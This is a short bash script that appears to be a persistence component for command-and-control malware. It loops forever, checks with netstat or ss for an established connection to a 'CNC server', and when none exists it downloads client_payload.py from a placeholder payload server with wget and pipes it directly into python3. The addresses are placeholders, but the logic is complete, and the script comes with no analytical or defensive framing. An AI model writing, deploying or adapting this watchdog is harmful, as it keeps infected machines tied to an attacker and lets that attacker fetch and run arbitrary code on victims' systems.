#!/usr/bin/env bash

while :
do
    # CHeck if we have netstat/ss installed - see if we have a tcp connection to our CNC server
    if netstat --version &> /dev/null
    then
        tcp_con=$(netstat -tupn | grep ESTABLISHED | egrep '<cnc_ip>:<cnc_port>' | awk '{ print $1 }' | xargs)
    else
        tcp_con=$(ss -tupn | grep ESTAB | egrep '<cnc_ip>:<cnc_port>' | awk '{ print $1 }' | xargs)
    fi

    # If we don't have a connection - start another
    [[ ! "${tcp_con}" =~ tcp ]] && wget -q -O - <payload_server_ip>:<payload_server_port>/client_payload.py | python3
    sleep 3 # run every 3s

done
